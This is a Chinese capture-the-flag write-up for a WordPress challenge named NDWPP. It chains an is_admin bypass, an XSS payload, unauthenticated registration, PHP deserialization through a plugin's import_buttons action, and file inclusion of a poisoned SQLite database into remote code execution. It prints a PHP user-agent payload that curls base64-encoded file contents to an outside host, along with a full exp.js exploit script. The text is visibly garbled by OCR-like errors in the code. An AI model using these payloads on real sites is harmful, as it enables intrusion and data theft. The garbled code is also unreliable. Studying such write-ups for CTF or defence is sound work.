---
tags: [WordPress, XSS, CSRF, PHP反序列化, LFI, RCE]
---

# NDWPP

利用题目WordPress插件会提前exit的特性， 同时利用admin_ajax会define ADMIN这个全局变量

的特性， 可以绕过is_admin的限制：

```
public  function  custom_login_template()
{
if  (isset($_GET [ 'login ' ]))  {
include(plugin_dir_path(一FILE一 )  .  'login-template .php ');
exit ;
}
}
public  function  do_register()
{

if  ( !$this→is_localhost())  {
return  "Registration  is  only  allowed  on  localhost " ;
}
if  ( !is_admin()){
return  "Only  admin  can  register  a  user ! " ;
}
```

只需让bot请求如下path ，在没有任何登录身份的前提下就可以注册账号：

 

/wp-admin/admin-ajax .php?login&register=1

 

 

问题是如何获取csrf token呢？



那就找一个xss：

```
http:Ⅱ127.0.0.1/?
payment_gateway=123%3C/script%3E%3Cscript%3Ealert(1 )%3C/script%3E&payment_from _app=123
```

social-media-builder/classes/SgmbButton.php 插 件 里 有 一 个 函 数 importButtons 可 以 通 过wp_ajax进行反序列化

按照如下方式请求， 可以将 http:Ⅱxxxx 的返回内容反序列化， 但是需要在登录状态

```
POST  /wp-admin/admin-ajax.php  HTTP/1.1
Host :  127 .0 .0 .1
Content-Type :  application/x-www-form-urlencoded
Content-Length :  70

action=import_buttons&attachmentUrl=http:Ⅱxxxx
```

那整体的攻击链条就是:

xss bot→ 注册账号→ 登录账号→ 触发反序列化反序列化可以利用题目插件的类：

```
public  function  一destruct(){
$session_id  =  session_id() ;
if  (wp_verify_nonce ($this→ user_nonce ,  'login_nonce_ '  .  $session_id)) {
if  (isset($this→ user_func)  绥  isset($this→ user_arg)){
return  get_defined_functions()[ 'user ' ] [$this→ user_func]
($this→ user_arg) ;
}
}
}
```

get_defined_functions()['user'] 最终选用wp_get_l10n_php_file_data($file) 这个函数:

```
function  wp_get_l10n_php_file_data(  $php_file  )  {
$data  =  (array)  include  $php_file;
…
```

只需要include题目的数据库 /tmp/ndwp.sqlite



然后在触发反序列之前， 带着恶意的user-agent去登录就会被存到数据库里面

```
ua=  <?php  system("curl  <http:Ⅱxxxxx?a=`cat>  /*.txt|base64`");?>
```

最终exp.js如下:

```
var  host  =  "http:Ⅱlocalhost:8080/"
if(typeof  window .start_hack  =  'undefined '){
window .start_hack  =  true;
async  function  fetchLoginNonce()  {
const  response  =  await  fetch(host  +   ' ?login=1 ') ;
const  text  =  await  response .text();

const  parser  =  new  DOMParser() ;
const  doc  =  parser .parseFromString(text ,  'text/html ') ;
const  loginNonceInput  =  doc .querySelector('input [name= "login_nonce"] ') ;

return  loginNonceInput  ?  loginNonceInput .value  :  null;
}
async  function  registerUser(username ,  password ,  email ,  loginNonce)  { const  url  =  host  +   'wp-admin/admin-ajax .php?login&register=1 ' ;
const  formData  =  new  URLSearchParams({
username :  username ,
password :  password ,
email :  email ,
action :   'register ' ,
login_nonce :  loginNonce ,
}) ;

const  response  =  await  fetch(url ,  {
method :   'POST ' ,
headers :  {
'Content-Type ' :   'application/x-www-form-urlencoded ' , } ,
body :  formData .toString() ,
}) ;

return  response ;
}
async  function  loginUser(username ,  password ,  loginNonce)  {
const  url  =  host  +   ' ?login=1 ' ;
const  formData  =  new  URLSearchParams({
username :  username ,
password :  password ,

action :   'login ' ,
login_nonce :  loginNonce , }) ;
const  response  =  await  fetch(url ,  {
method :   'POST ' ,
headers :  {
'Content-Type ' :   'application/x-www-form-urlencoded ' , } ,
body :  formData .toString() , }) ;

return  response ;
}

async  function  importButtons(attachmentUrl ,  loginNonce)  { const  url  =  host  +   'wp-admin/admin-ajax .php ' ;
const  formData  =  new  URLSearchParams({
action :   'import_buttons ' ,
attachmentUrl :  attachmentUrl ,
login_nonce :  loginNonce , }) ;
const  response  =  await  fetch(url ,  {
method :   'POST ' ,
headers :  {
'Content-Type ' :   'application/x-www-form-urlencoded ' , } ,
body :  formData .toString() , }) ;

return  response ;
}

fetchLoginNonce() .then(loginNonce  →  { if  (loginNonce)  {
console .log(`Login  nonce  is :  ${loginNonce}`) ;
registerUser( 'test123test123 ' ,  'test123test123 ' ,   'test@qq .com ' , loginNonce)
.then(response  →  {
console .log('Registration  response : ' ,  response) ;
fetchLoginNonce() .then(loginNonce  →  {
if  (loginNonce)  {
console .log(`Login  nonce  is :  ${loginNonce}`) ;
loginUser( 'test123test123 ' ,  'test123test123 ' , loginNonce) .then(response  →  {
console .log( ' Login  response : ' ,  response) ;

fetchLoginNonce() .then(loginNonce  →  {
if  (loginNonce)  {
console .log(`Login  nonce  is :  ${loginNonce}`) ;
importButtons('http:Ⅱxxxxxxx/test.php?
nonce= '+loginNonce ,  loginNonce) .then(response  →  {
console .log( 'Import  buttons  response : ' ,  response) ; }) ;
}
}) ;

}) ;
}
}) ;
})
.catch(error  →  {
console .error ('Registration  failed : ' ,  error) ;
}) ;   }  else  {
console .error ( ' Login  nonce  could  not  be  found ') ; }
}) ;

}
```

